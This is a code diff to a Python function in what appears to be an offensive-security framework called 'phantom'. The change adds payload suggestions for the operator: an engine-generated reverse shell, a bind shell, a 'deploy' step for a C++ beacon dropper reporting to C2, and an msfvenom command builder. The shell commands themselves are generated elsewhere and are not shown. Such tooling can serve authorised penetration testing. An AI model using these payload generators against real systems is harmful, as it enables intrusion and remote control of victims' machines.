@@ -539,10 +539,23 @@ def payload_suggestion_group() -> dict:
     spec = pf.spec(plat, "x64")
     lhost = session.lhost or "127.0.0.1"
     lport = session.lport or 4444
+    # engine-backed multi-dialect reverse/bind first (enterprise engine,
+    # same one auto-mode uses), then the classic msfvenom wizard
+    from phantom.automation.brain.payload import get_payload_engine
+    eng = get_payload_engine()
+    best = eng.reverse(plat, lhost, lport)
     return {
         "SUGGESTED (payload)": [
-            pf.msfvenom_command(spec, lhost, lport, out=spec.staging_path),
+            f"reverse {lhost} {lport}   # {best.note} — {best.command}",
             f"generate {plat}",
+        ],
+        "ENGINE (multi-dialect)": [
+            f"reverse {lhost} {lport}   # best dialect ({best.dialect})",
+            f"bind 4444                  # target listens (loud, last resort)",
+            f"deploy                      # PHANTOM C++ beacon dropper -> C2",
+        ],
+        "MSF (classic)": [
+            pf.msfvenom_command(spec, lhost, lport, out=spec.staging_path),
         ],
     }
 
